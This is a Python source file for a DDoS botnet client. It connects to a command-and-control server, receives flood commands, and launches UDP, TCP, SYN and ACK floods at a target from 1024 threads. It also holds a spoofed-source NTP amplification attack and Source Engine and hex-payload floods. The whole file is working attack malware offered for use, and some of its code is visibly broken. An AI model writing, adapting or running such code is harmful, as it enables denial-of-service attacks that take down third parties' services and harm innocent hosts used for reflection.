from urllib import request
from scapy.all import IP, UDP, Raw, ICMP, send
from struct import pack as data_pack
import struct
import requests
import socket 
import threading
import time
import random
import sys
import os

# c2 server ip and port
C2_ADDRESS  = '127.0.0.1'
C2_PORT     = 66

print("[Bot] Connected")
print("[Bot] Ready For commands")

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def attack_vse(ip, port, secs): # vse attack
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def attack_udp(ip, port, secs, size): # udp attack 
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport)) 

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        print(f"Erro: {e}")
        pass

    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=random.randint(1, 65535), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(50000000):
                    send(packet, count=packets, verbose=False)
                    #print('NTP SEND')
            except Exception as e:
               # print(f"Erro: {e}")
                pass
        except Exception as e:
            #print(f"Erro: {e}")
            pass

############
        
def attack_hex(ip, port, secs):
    payloadC = b'\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payloadC, (ip, port))

def attack_tcp(ip, port, secs, size): # tcp attack
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_syn(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
        except:
            pass

def attack_ack(ip, port, secs):
    
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = "A"
        flagss = 0x010
        flagd = "ACK"
        
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
            pktt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flagss, 0, 0, 0, 0)
            pkttt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flagd, 0, 0, 0, 0)
            
            while time.time() < secs:
                s.send(pkt)
                s.send(pktt)
                s.send(pkttt)
                print('sending ACK')
        except:
            s.close()

def main():
        args = list[str];
        command = ""

        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        c2.connect((C2_ADDRESS, C2_PORT))
        c2.send('669787761736865726500'.encode())
        time.sleep(1)
        while 1:
            print("Listening to server....!")
            try:
                data = c2.recv(1024).decode().strip()
                if " " in data:
                    args = data.split(" ")
                    command = args[0]

#               receiving commands do not break these otherwise ur attacks just wont send.... :tears:
                print(f"[ + ] New data from CNC server..... {data} \n")

                if command.lower() == 'udpflood':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    # threads = int(args[5])

                    for _ in range(1024):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()   

                elif command.lower() == 'tcpflood': 
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    #threads = int(args[5])

                    for _ in range(1024):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command.lower() == 'synflood':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    #threads = int(args[4])

                    for _ in range(1024):
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()

                elif command.lower() == 'ackflood':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    #threads = 5000

                    for _ in range(1024):
                        threading.Thread(target=attack_ack, args=(ip, port, secs), daemon=True).start()
                        print("starting")

                elif command.lower() == 'PING':
                    c2.send('PONG'.encode())

            except:
                break

        c2.close()

        main()

if __name__ == '__main__':
        try:
            main()
        except:
            pass